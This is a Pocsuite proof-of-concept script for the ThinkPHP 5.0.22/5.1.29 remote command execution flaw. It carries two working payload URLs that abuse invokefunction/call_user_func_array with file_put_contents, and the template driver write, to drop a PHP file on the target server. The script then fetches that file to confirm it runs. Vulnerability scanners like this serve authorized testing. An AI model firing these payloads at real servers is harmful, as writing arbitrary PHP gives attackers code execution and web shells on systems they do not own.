#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import urlparse
from pocsuite.api.request import req
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    vulID = 'N/A'  # ssvid
    version = '1.0'
    author = ['co0ontty']
    vulDate = '2019-08-12'
    createDate = '2019-08-12'
    updateDate = '2019-08-12'
    references = ['https://blog.thinkphp.cn/869075']
    name = 'Thinkphp 5.0.22/5.1.29 远程命令执行漏洞'
    appPowerLink = 'http://www.thinkphp.cn'
    appName = 'Thinkphp'
    appVersion = '5.0.22/5.1.29'
    vulType = '命令执行'
    desc = ''' 
    由于框架对控制器名没有进行足够的检测，会导致在没有开启强制路由的情况下引发 getshell 漏洞。该漏洞影响 5.0.22/5.1.29 版本。
    '''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        def vul_check(payload):
            url = urlparse.urljoin(base_url, payload)
            create_verify_file = req.get(url)
            get_verify_str = req.get(verify_url)
            return get_verify_str

        result = {}
        base_url = self.url
        if (urlparse.urlparse(base_url).port) is None:
            base_url = base_url+":80"
        verify_str = randomStr(6)
        verify_filename = randomStr(3)
        verify_url = urlparse.urljoin(base_url, verify_filename+".php")
        payload_list = [
            "index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]={}.php&vars[1][]=<?php echo '{}';?>".format(
                verify_filename, verify_str),
            "index.php?s=index/\\think\\template\driver\\file/write?cacheFile={}.php&content=<?php echo '{}';?>".format(
                verify_filename, verify_str)
        ]
        if any(verify_str in vul_check(x) for x in payload_list):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
